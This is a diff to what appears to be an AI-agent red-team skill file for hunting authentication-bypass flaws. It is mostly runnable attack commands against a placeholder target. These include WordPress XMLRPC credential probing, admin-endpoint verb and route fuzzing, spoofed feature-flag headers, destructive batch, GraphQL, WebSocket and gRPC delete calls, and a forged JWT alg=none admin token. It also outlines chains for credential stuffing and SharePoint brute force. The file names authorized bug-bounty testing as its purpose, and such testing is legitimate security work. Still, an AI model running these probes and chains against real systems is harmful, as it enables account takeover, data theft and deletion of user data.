@@ -4,9 +4,50 @@ description: Hunting skill for auth bypass vulnerabilities. Built from 12 public
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [auth, bypass, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [auth, bypass, hunt, redteam]
+  category: redteam
 ---
+
+## When to Use
+
+- Hunting auth bypass — see the Legacy-Protocol Matrix for branded-UI vs legacy-endpoint patterns.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `python3`, `subfinder`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/xmlrpc.php \
+  -H "Content-Type: text/xml" \
+  -d '<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.listMethods</methodName>
+  <params></params>
+</methodCall>'
+
+# If 200 with method list → XMLRPC is enabled, test auth:
+curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/xmlrpc.php \
+  -H "Content-Type: text/xml" \
+  -d '<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+    <param><value><string>admin</string></value></param>
+    <param><value><string>password</string></value></param>
+  </params>
+</methodCall>'
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -356,7 +397,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 10. **HackerOne — SAML signup domain enforcement bypass via control characters** ([H1 #2101076](https://hackerone.com/reports/2101076))
     - Subclass: partner-portal / SAML domain-binding bypass via unicode control characters
-    - Payload: new user sign-up at SAML-enforced org; append trailing control character (e.g., `\r`, ` `) to email → domain comparison normalises away, signup proceeds → unauthorised access to the org
+    - Payload: new user sign-up at SAML-enforced org; append trailing control character (e.g., `\r`, `\x00`) to email → domain comparison normalises away, signup proceeds → unauthorised access to the org
     - Root cause: inconsistent unicode/control-char normalisation between domain check and identity write
     - Year: 2024 — bounty awarded (amount undisclosed)
 
@@ -438,33 +479,106 @@ app.post('/api/admin/delete', deleteUser);         // no server-side check
 
 **Real paid example — HackerOne TrustHub:** `POST /graphql` with the `TrustHubQuery` operation had no authorization check — a regular user could read all vendors' data (CVSS 8.7, High). The object-level variant (e.g. a WebSocket `get_history` accepting an arbitrary UUID with no ownership check) belongs to `hunt-idor`.
 
----
+### Function-Level Probe Set (merged from hunt-broken-function-level-auth)
 
-## Verification
+Replay every privileged endpoint from a regular session and from no session; a differential against the 403 its siblings return is the finding.
 
-Run this self-test to confirm auth bypass hunting readiness:
+### Phase 1 — HTTP Verb Drift
 
-1. **JWT alg:none test** — verify token generation:
-   ```bash
-   python3 -c "
-   import base64,json
-   h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
-   p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
-   print(f'{h}.{p}.')
-   " && echo "PASS: alg=none token generated" || echo "FAIL"
-   ```
+```bash
+# Admin endpoints — each HTTP method may have different auth
+ENDPOINTS=(
+  "/api/admin/users"
+  "/api/admin/settings"
+  "/api/manage/orders"
+  "/api/internal/config"
+)
 
-2. **X-Forwarded-For bypass syntax** — confirm header injection:
-   ```bash
-   echo "X-Forwarded-For: 127.0.0.1" | grep -q "127.0.0.1" && echo "PASS: bypass header syntax" || echo "FAIL"
-   ```
+for ep in "${ENDPOINTS[@]}"; do
+  for method in GET POST PUT PATCH DELETE; do
+    curl --max-time 30 --connect-timeout 10 -sk -X "$method" "https://target.com$ep" \
+      -w "$method $ep — %{http_code}\n" -o /dev/null
+  done
+  # Also try custom methods
+  curl --max-time 30 --connect-timeout 10 -sk -X "PURGE" "https://target.com$ep" -o /dev/null -w "PURGE — %{http_code}\n"
+  curl --max-time 30 --connect-timeout 10 -sk -X "DEBUG" "https://target.com$ep" -o /dev/null -w "DEBUG — %{http_code}\n"
+done
+```
 
-3. **Direct URL bypass test** — confirm post-login path probing:
-   ```bash
-   echo "/dashboard /admin /settings /account" | grep -q "dashboard" && echo "PASS: post-login path list present" || echo "FAIL"
-   ```
+### Phase 2 — Route Shadowing
 
-All 3 tests verify auth bypass probing capability.
+```bash
+# Legacy routes that bypass modern middleware
+for path in "/api/v0/" "/api/v1/" "/api/legacy/" "/api/internal/" "/api/beta/" \
+            "/api/mobile/" "/api/partner/" "/api/integration/" "/api/webhook/"; do
+  curl --max-time 30 --connect-timeout 10 -sk "https://target.com${path}users" -w "%{http_code} — $path\n" -o /dev/null
+done
+
+# ffuf for route discovery
+ffuf -u "https://target.com/api/FUZZ/users" \
+  -w /path/to/prefixes.txt \
+  -mc 200,301,401,403
+```
+
+### Phase 3 — Feature Flag Bypass
+
+```bash
+# Beta/preview endpoints often lack authorization
+for flag in "beta" "preview" "canary" "experimental" "new" "v2" "preview"; do
+  curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/${flag}/admin" -w "%{http_code} — $flag\n" -o /dev/null
+done
+
+# Feature flags in headers or cookies
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
+  -H "X-Feature-Flags: admin" \
+  -H "X-Experimental: true" \
+  -H "X-Beta-Access: 1"
+```
+
+### Phase 4 — Batch & Job Endpoints
+
+```bash
+# Batch operations may skip per-item authorization
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/batch" \
+  -H "Content-Type: application/json" \
+  -d '{"operations":[{"method":"DELETE","path":"/users/1"},{"method":"GET","path":"/admin/logs"}]}'
+
+# Background job endpoints
+for path in "/api/jobs" "/api/tasks" "/api/cron" "/api/queue" "/api/workers"; do
+  curl --max-time 30 --connect-timeout 10 -sk "https://target.com${path}/admin-cleanup" -w "%{http_code} — $path\n" -o /dev/null
+done
+```
+
+### Phase 5 — Transport Protocol Inconsistency
+
+```bash
+# GraphQL — check if mutations allow admin actions without role check
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'
+
+# WebSocket — actions sent over WS may skip REST middleware
+# Test via wscat
+echo '{"type":"DELETE_USER","payload":{"userId":1}}' | wscat -c "wss://target.com/ws"
+
+# gRPC — reflection may expose admin methods
+grpcurl -plaintext target.com:50051 list
+grpcurl -plaintext target.com:50051 admin.UserService/DeleteUser
+```
+
+### Phase 6 — Content-Type Middleware Gaps
+
+```bash
+# Different content types may hit different parsers/middleware
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
+  -H "Accept: application/xml" \
+  -H "Content-Type: application/xml" \
+  -d '<user><name>test</name></user>'
+
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
+  -H "Content-Type: multipart/form-data" \
+  -F "name=test"
+```
 
 ---
 
@@ -476,17 +590,6 @@ All 3 tests verify auth bypass probing capability.
 - **401 on direct access but 200 via proxy path** — some apps have `/internal/` paths that bypass auth when accessed via specific routes. Map the full routing tree.
 - **Header-based auth that conflicts with cookie auth** — if both `Authorization: Bearer` and session cookie are sent, one may override the other. Test each independently.
 - **Step-up auth bypass** — bypassing 2FA/MFA after initial login is the most common auth-bypass pattern. Test direct navigation to post-login URLs.
-
-
----
-
-## Related Skills & Chains
-
-- **`hunt-idor`** — Auth bypass without object-level access is half a finding; pair them. Chain primitive: legacy `/v1/users/{id}` route missing both auth middleware AND ownership check = unauthenticated cross-tenant data read via direct ID substitution → full PII dump from "I am nobody" starting position.
-- **`hunt-ato`** — Auth-bypass primitives feed the ATO funnel. Chain primitive: XMLRPC native-cred acceptance + no rate limit on `wp.getUsersBlogs` → credential-stuff with breach corpus from `hunt-misc` recon → `system.multicall` batches 1000 cred pairs per request → one valid pair = ATO bypassing the SSO + MFA the UI enforces.
-- **`hunt-sharepoint`** — The SP equivalent of the WordPress XMLRPC pattern lives here. Chain primitive: `/_vti_bin/Authentication.asmx` anonymous reachable + native Forms-auth credential accepted + zero rate limit = unlimited credential brute-force endpoint bypassing custom-branded `customlogin.aspx` protections → FedAuth cookie → full SharePoint farm access.
-- **`security-arsenal`** — Pull the JWT-attack payloads section (alg=none, kid path-traversal, JWK injection, RS256→HS256 key confusion) when JWT validation is the auth wall; pull the SAML signature-stripping section when the SP accepts unsigned assertions.
-- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "auth bypass" that only enumerates usernames or only reveals a 401-vs-403 differential. Username enumeration alone without lockout-amplification is consistently N/A or Informational on H1.
 
 ### Phase X — Auth Provider Confusion
 
@@ -535,8 +638,43 @@ After impersonating a privileged user, check if group/role management is availab
 # 2. Register new attacker account
 # 3. As admin, add attacker to ADMINISTRATORS group via UCP (no password needed)
 # 4. Login as attacker → full ACP access with known password
-
-## Related Skills
-
-- **`password-spray-methodology`** — Universal password spray pipeline across all protocols + error code differentials
 ```
+
+---
+
+## Verification
+
+Run this self-test to confirm auth bypass hunting readiness:
+
+1. **JWT alg:none test** — verify token generation:
+   ```bash
+   python3 -c "
+   import base64,json
+   h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
+   p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
+   print(f'{h}.{p}.')
+   " && echo "PASS: alg=none token generated" || echo "FAIL"
+   ```
+
+2. **X-Forwarded-For bypass syntax** — confirm header injection:
+   ```bash
+   echo "X-Forwarded-For: 127.0.0.1" | grep -q "127.0.0.1" && echo "PASS: bypass header syntax" || echo "FAIL"
+   ```
+
+3. **Direct URL bypass test** — confirm post-login path probing:
+   ```bash
+   echo "/dashboard /admin /settings /account" | grep -q "dashboard" && echo "PASS: post-login path list present" || echo "FAIL"
+   ```
+
+All 3 tests verify auth bypass probing capability.
+
+---
+
+## Related Skills & Chains
+
+- **`hunt-idor`** — Auth bypass without object-level access is half a finding; pair them. Chain primitive: legacy `/v1/users/{id}` route missing both auth middleware AND ownership check = unauthenticated cross-tenant data read via direct ID substitution → full PII dump from "I am nobody" starting position.
+- **`hunt-ato`** — Auth-bypass primitives feed the ATO funnel. Chain primitive: XMLRPC native-cred acceptance + no rate limit on `wp.getUsersBlogs` → credential-stuff with breach corpus from `hunt-misc` recon → `system.multicall` batches 1000 cred pairs per request → one valid pair = ATO bypassing the SSO + MFA the UI enforces.
+- **`hunt-sharepoint`** — The SP equivalent of the WordPress XMLRPC pattern lives here. Chain primitive: `/_vti_bin/Authentication.asmx` anonymous reachable + native Forms-auth credential accepted + zero rate limit = unlimited credential brute-force endpoint bypassing custom-branded `customlogin.aspx` protections → FedAuth cookie → full SharePoint farm access.
+- **`security-arsenal`** — Pull the JWT-attack payloads section (alg=none, kid path-traversal, JWK injection, RS256→HS256 key confusion) when JWT validation is the auth wall; pull the SAML signature-stripping section when the SP accepts unsigned assertions.
+- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "auth bypass" that only enumerates usernames or only reveals a 401-vs-403 differential. Username enumeration alone without lockout-amplification is consistently N/A or Informational on H1.
+- **`password-spray-methodology`** — Universal password spray pipeline across all protocols + error code differentials
